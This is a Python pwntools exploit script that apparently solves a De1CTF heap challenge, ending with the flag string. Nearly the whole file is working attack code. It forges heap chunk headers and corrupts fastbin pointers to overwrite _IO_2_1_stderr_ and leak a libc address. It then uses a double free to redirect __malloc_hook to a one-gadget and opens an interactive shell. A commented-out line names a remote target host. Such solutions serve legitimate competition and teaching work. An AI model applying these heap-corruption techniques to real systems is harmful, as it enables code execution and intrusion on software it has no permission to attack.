from pwn import *
import time
import struct


binpath = './pwn'
context.binary = binpath
context.terminal = ['tmux', 'split-w', '-h']
# context.log_level = 'debug'

elf = ELF(binpath)
libc = elf.libc


gdbscript = '''
gef
set $table=0x0000555555756060
# after menu
b *(0x0000555555554000+0xea7)
gef config context.clear_screen 1
'''
io = None
def main():
    global io
    while True:
        try:
            io = gdb.debug(binpath, aslr=False, gdbscript=gdbscript)
            # io = process(binpath)
            # io = remote('139.180.216.34', 8888)
            # This exploits works only once in 1 / 2^4 !!!
            exploit()
        except EOFError:
            io.close()
            # break
            continue


def debug(func):
    def wrapper(*args, **kwargs):
        print "{}({}, {})".format(func.__name__, str(args), str(kwargs))
        return func(*args, **kwargs)
    return wrapper


@debug
def create(size, index, name):
    io.recvuntil('>>')
    io.sendline('1')

    io.recvuntil('weapon:')
    io.sendline(str(size))

    io.recvuntil('index:')
    io.sendline(str(index))

    io.recvuntil('name:')
    io.send(name)

@debug
def delete(index):
    io.recvuntil('>>')
    io.sendline('2')

    io.recvuntil('idx :')
    io.sendline(str(index))

@debug
def rename(index, content):
    io.recvuntil('>>')
    io.sendline('3')

    io.recvuntil('idx:')
    io.sendline(str(index))

    io.recvuntil('content:')
    io.send(str(content))


def exploit():
    fake_chunk_hdr = ''
    fake_chunk_hdr += p64(0)
    fake_chunk_hdr += p64(0x31)
    create(0x18, 0, fake_chunk_hdr)
    create(0x60, 1, 'A' * 0x60)
    create(0x28, 2, 'B' * 0x28)
    create(0x28, 3, 'C' * 0x28)
    create(0x60, 4, 'D' * 0x60)
    create(0x60, 5, 'D' * 0x60)

    delete(4)
    delete(5)
    delete(2)
    delete(3)
    # point to fake_chunk_hdr by overwriting single byte of fd
    rename(3, chr(0x10))

    create(0x28, 6, 'consume')
    # this should return pointer to chunkd of 'A' (index: 1)
    # overwrite chunk size to small bins size
    # (0xa0 will be a good size overlapping the 'B' chunk exactly)
    create(0x28, 7, p64(0) + p64(0xa1))

    # freed chunk will be linked to unsorted bin
    delete(1)

    rename(7, p64(0) + p64(0x71))

    # overwrite last two bytes of LSBs to point to _IO_2_1_stderr_
    # target &_IO_stderr_2_1_+157
    # 0x00007ffff7dd25dd|+0x0000: 0xfff7dd1660000000 <- prev_size
    # 0x00007ffff7dd25e5|+0x0008: 0x000000000000007f <- size
    rename(1, p16(0x25dd))  # if ASLR is on this only succeeds at 1 / 2^4

    # link chunk created above to fastbins
    rename(5, chr(0x20))

    create(0x60, 8, 'consume')
    create(0x60, 9, 'consume')

    payload = ''
    payload += '\xcc' * 3  # pad
    payload += p64(0) * 6 # pad
    payload += p64(0xfbad3c80)  # DONT FORGET TO CHANGE flags !!!!
    payload += p64(0) * 3  # _IO_read_*
    payload += p8(0)  # last two bytes of LSBs of _IO_write_base
    # this should return _IO_2_1_+157+0x10
    create(0x60, 10, payload)

    data = io.recvuntil('1.').strip()
    addr_libc = u64(data[0x50:0x58]) - 0x3c56a3
    print '0x{:x}'.format(addr_libc)

    # __malloc_hook
    create(0x60, 11, 'E')
    create(0x60, 12, 'F')
    delete(11)
    delete(12)
    delete(11)

    create(0x60, 13, p64(addr_libc + libc.symbols['__malloc_hook'] - 0x23))
    create(0x60, 14, 'consume 1')
    create(0x60, 15, 'consume 2')
    create(0x60, 16, 'G' * 0x13 + p64(addr_libc + 0xf1147))  # one gadget

    io.recvuntil('>>')
    io.sendline("1")
    io.recvuntil('weapon: ')
    io.sendline('10')
    io.recvuntil('index: ')
    io.sendline('0')

    io.sendline('ls')
    io.interactive()


if __name__ == '__main__':
    main()
    # de1ctf{c4n_you_he4r_Me_SL}
